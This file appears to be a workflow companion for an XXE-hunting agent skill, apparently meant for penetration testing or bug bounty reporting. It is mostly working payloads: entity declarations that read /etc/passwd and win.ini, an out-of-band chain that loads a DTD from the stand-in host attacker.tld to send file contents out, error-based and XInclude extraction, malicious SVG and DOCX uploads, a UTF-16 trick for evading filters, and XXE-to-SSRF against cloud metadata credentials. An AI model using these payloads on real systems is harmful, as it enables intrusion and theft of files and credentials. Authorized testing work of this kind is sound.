# XXE Hunter — Deep Workflows

Companion to SKILL.md. Entity types, OOB exfil chains, upload vectors.

## Step 1: Find XML-consuming surfaces

```text
- Explicit XML APIs (SOAP, REST with application/xml)
- SAML assertions, SVG uploads rendered server-side
- Office docs (docx/xlsx/pptx are ZIPs of XML), RSS/Atom importers,
  sitemap parsers, config import features, doc converters
- Some JSON endpoints still parse XML on content-type switch — TRY IT:
  resend POST with Content-Type: application/xml and XML body
```

## Step 2: Classic in-band file read

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```
Windows: `file:///C:/Windows/win.ini`. PHP wrappers when available:
`php://filter/convert.base64-encode/resource=/etc/passwd` (binary-safe).

## Step 3: OOB exfil chain (when response not reflected)

Three files: attacker DTD + payload + callback log.

```bash
# On your web host /exfil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///%file;'>">
%eval;
%err;
# Payload:
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "https://attacker.tld/exfil.dtd">
  %remote;
]>
<r>any</r>
# Result: target requests file:///<contents> -> DNS/404 error leaks content
# line-by-line into YOUR access/error log. Base64-wrap for special chars:
#   %file wrapped via php://filter or CDATA-in-parameter-entity trick.
```

## Step 4: Error-based extraction

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<r>&error;</r>
```
Server's parser exception message includes the file contents fragment.
Works even without outbound network if errors render to client.

## Step 5: XInclude (partial XML handling)

When app embeds your input into an existing document (no DOCTYPE control):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Step 6: Upload-format vectors

```bash
# SVG:
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&x;</text></svg>

# DOCX/XLSX: unzip -> patch word/document.xml with entity -> rezip ->
upload through converter/preview feature; extracted text returns in output.

# UTF-16 encoding trick bypasses naive "<!DOCTYPE" string filters:
iconv -f UTF-8 -t UTF-16BE payload.xml > payload16.xml
```

## False-positive elimination

1. `file:///etc/passwd` success must show REAL passwd lines, not echo.
2. OOB callbacks must originate from target infra (correlate egress IP).
3. Confirm the parser actually resolves entities vs treating as text
   (check whether literal `&xxe;` string is returned instead).

## Severity guidance

File read as service user: High. Metadata creds via XXE->SSRF: Critical.
Cloud metadata via gopher-less SSRF from XXE often needs IMDSv1 — note
IMDSv2 limitation honestly. Use assets/report-template.md.
